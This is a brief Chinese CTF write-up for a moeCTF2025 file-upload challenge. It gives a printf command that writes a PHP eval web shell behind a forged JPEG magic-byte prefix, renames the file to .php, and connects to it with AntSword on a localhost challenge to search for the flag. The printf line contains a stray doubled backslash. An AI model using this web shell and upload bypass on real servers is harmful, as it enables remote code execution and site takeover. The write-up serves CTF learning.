moeCTF2025里面的文件上传题目
1.如：理清思路、题目可以上传所有文件，但上传的文件上传成功，需要有"FF D8 FF"这样的jpg文件的前缀，我们可以通过这个来弄个前缀为FF D8 FF的php木马文件，使其可以控制终端
2.图片木马文件创建
	可以用`echo`或`printf '\xff\\xd8\xff\n<?php eval($_POST["cmd"]); ?>' >shell.jpg`
	这里的shell.jpg命令外' '里" "是因为PHP8.2不支持外" "里' '
3.上传时，将shell.jpg命令改为shell.php方便对系统的控制
4.使用蚁剑连接
	如:`http://127.0.0.1:46229/uploads/shell.php`
	添加完成后，用蚁剑里面的终端打开，用我们自己知道的kali命令找目标就行
	可以用`find / -iname flag.txt 2>/dev/null`
	(其中find后面的/是可以从根目录/寻找，-iname他可以不区分大小写，2>/dev/null隐藏权限不足产生的错误)
	`grep -r "flag" / 2>/dev/null`
